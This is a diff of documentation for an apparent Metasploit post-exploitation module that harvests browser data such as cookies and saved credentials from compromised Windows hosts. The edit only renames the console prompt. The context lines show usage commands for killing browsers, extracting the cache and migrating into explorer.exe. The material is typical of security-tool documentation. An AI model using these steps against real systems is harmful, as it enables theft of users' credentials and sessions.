@@ -106,7 +106,7 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 ### Normal Session
 
 ```bash
-msf6 post(windows/gather/enum_browsers) > run
+msf post(windows/gather/enum_browsers) > run
 
 [*] Targeting: W00T\ah (IP: 178.238.175.xxx)
 [*] System Information: W00T | OS: Windows 11 (10.0 Build 27729). | Arch: x64 | Lang: en_US
@@ -159,9 +159,9 @@ msf6 post(windows/gather/enum_browsers) > run
 ### Select only specific browser for extraction 
 
 ```bash
-msf6 post(windows/gather/enum_browsers) > set BROWSER_TYPE firefox
+msf post(windows/gather/enum_browsers) > set BROWSER_TYPE firefox
 BROWSER_TYPE => firefox
-msf6 post(windows/gather/enum_browsers) > run
+msf post(windows/gather/enum_browsers) > run
 
 [*] Targeting: W00T\ah (IP: 178.238.175.xxx)
 [*] System Information: W00T | OS: Windows 11 (10.0 Build 27729). | Arch: x64 | Lang: en_US
@@ -186,7 +186,7 @@ msf6 post(windows/gather/enum_browsers) > run
 If the browser processes are running, cookies and other files may be locked and inaccessible. Use the `KILL_BROWSER` option to kill browsers before extraction:
 
 ```bash
-msf6 post(windows/gather/enum_browsers) > set KILL_BROWSER true
+msf post(windows/gather/enum_browsers) > set KILL_BROWSER true
 KILL_BROWSER => true
 ```
 
@@ -197,9 +197,9 @@ This will kill any selected & running browser processes and avoid file access is
 Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.
 
 ```bash
-msf6 post(windows/gather/enum_browsers) > set EXTRACT_CACHE true
+msf post(windows/gather/enum_browsers) > set EXTRACT_CACHE true
 EXTRACT_CACHE => true
-msf6 post(windows/gather/enum_browsers) > run
+msf post(windows/gather/enum_browsers) > run
 
 [*] Targeting: W00T\ah (IP: 178.238.175.xxx)
 [*] System Information: W00T | OS: Windows 11 (10.0 Build 27723). | Arch: x64 | Lang: en_US
@@ -226,9 +226,9 @@ msf6 post(windows/gather/enum_browsers) > run
 If you want to ensure that the session runs in the user context (e.g., `explorer.exe`) to avoid access issues, enable the `USER_MIGRATION` option:
 
 ```bash
-msf6 post(windows/gather/enum_browsers) > set USER_MIGRATION true
+msf post(windows/gather/enum_browsers) > set USER_MIGRATION true
 USER_MIGRATION => true
-msf6 post(windows/gather/enum_browsers) > run
+msf post(windows/gather/enum_browsers) > run
 
 [*] Found explorer.exe running with PID: 11520. Attempting migration.
 [+] Successfully migrated to explorer.exe (PID: 11520).
@@ -242,9 +242,9 @@ msf6 post(windows/gather/enum_browsers) > run
 If you want to see each step of the extraction and decryption process, enable verbose mode:
 
 ```bash
-msf6 post(windows/gather/enum_browsers) > set VERBOSE true
+msf post(windows/gather/enum_browsers) > set VERBOSE true
 VERBOSE => true
-msf6 post(windows/gather/enum_browsers) > run
+msf post(windows/gather/enum_browsers) > run
 
 [*] Targeting: W00T\ah (IP: 178.238.175.xxx)
 [*] System Information: W00T | OS: Windows 11 (10.0 Build 27729). | Arch: x64 | Lang: en_US
